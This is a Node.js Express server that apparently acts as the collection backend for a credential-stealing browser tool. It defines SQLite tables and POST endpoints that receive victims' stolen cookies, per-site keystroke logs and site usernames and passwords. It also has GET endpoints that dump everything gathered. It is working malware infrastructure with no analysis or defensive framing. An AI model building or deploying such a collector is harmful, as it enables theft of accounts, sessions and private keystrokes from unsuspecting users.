const express = require("express");
const app = express();
const port = 6900;

const sqlite3 = require("sqlite3");
const db = new sqlite3.Database(":memory");

/*
  CREATE TABLE cookie (
    userId CHAR(10) NOT NULL,
    name VARCHAR DEFAULT '',
    value VARCHAR DEFAULT '',
    metadata VARCHAR DEFAULT '',
  )
*/
db.run(
  "CREATE TABLE cookie (userId CHAR(10) NOT NULL, name VARCHAR DEFAULT '', value VARCHAR DEFAULT '', metadata VARCHAR DEFAULT '')"
);

/*
  CREATE TABLE keylog (
    userId CHAR(10) NOT NULL,
    site VARCHAR DEFAULT '',
    keystrokes VARCHAR DEFAULT ''
  )
*/
db.run(
  "CREATE TABLE keylog (userId CHAR(10) NOT NULL, site VARCHAR default '', keystrokes VARCHAR default '')"
);

/*
  CREATE TABLE credentials (
    userId CHAR(10) NOT NULL,
    site VARCHAR default '',
    username VARCHAR default '',
    password VARCHAR default ''
  )
*/
db.run(
  "CREATE TABLE credentials ( userId CHAR(10) NOT NULL, site VARCHAR default '', username VARCHAR default '', password VARCHAR default '')"
);

app.use(express.json());

app.get("/show-cookies", (req, res) => {
  db.all("SELECT * FROM cookie", [], (err, rows) => {
    if (err) console.log(err);
    else res.send(JSON.stringify(rows));
  });
  console.log(req.query);
});

app.get("/show-keylogs", (req, res) => {
  db.all("SELECT * from keylog", [], (err, rows) => {
    if (err) console.log(err);
    else res.send(JSON.stringify(rows));
  });
  console.log(req.query);
});

app.get("/show-credentials", (req, res) => {
  db.all("SELECT * from credentials", [], (err, rows) => {
    if (err) console.log(err);
    else res.send(JSON.stringify(rows));
  });
  console.log(req.query);
});

app.post("/cookie", (req, res) => {
  res.send(JSON.stringify(req.body.data));
  if (!checkID(req.headers.uid)) return; //verify UID
  req.body.data.forEach((cookie) => {
    db.run(
      "INSERT INTO cookie (userId, name, value, metadata) VALUES (?, ?, ?, ?)",
      [req.headers.uid, cookie.name, cookie.value, getMetadata(cookie)]
    );
  });
});

app.post("/keylog", (req, res) => {
  res.send(JSON.stringify(req.body.data));
  if (!checkID(req.headers.uid)) return;
  let database = req.body.data.database;
  for (const entry in database) {
    db.run("INSERT INTO keylog (userId, site, keystrokes) VALUES (?, ?, ?)", [
      req.headers.uid,
      entry,
      database[entry],
    ]);
  }
});

app.post("/credentials", (req, res) => {
  res.send(JSON.stringify(req.body.data));
  if (!checkID(req.headers.uid)) return;
  let creds = req.body.data.credentials;
  db.run(
    "INSERT INTO credentials (userId, site, username, password) VALUES (?, ?, ?, ?)",
    [req.headers.uid, creds.domain, creds.username, creds.password]
  );
});

app.listen(port, () => {
  console.log(`Cookie logging listening at http://localhost:${port}`);
});

function checkID(uid) {
  return uid ? uid.length === 10 : false;
}

function getMetadata(cookie) {
  let meta = {};
  for (const key in cookie) {
    if (key === "name" || key === "value") continue;
    meta[key] = cookie[key];
  }
  return JSON.stringify(meta);
}
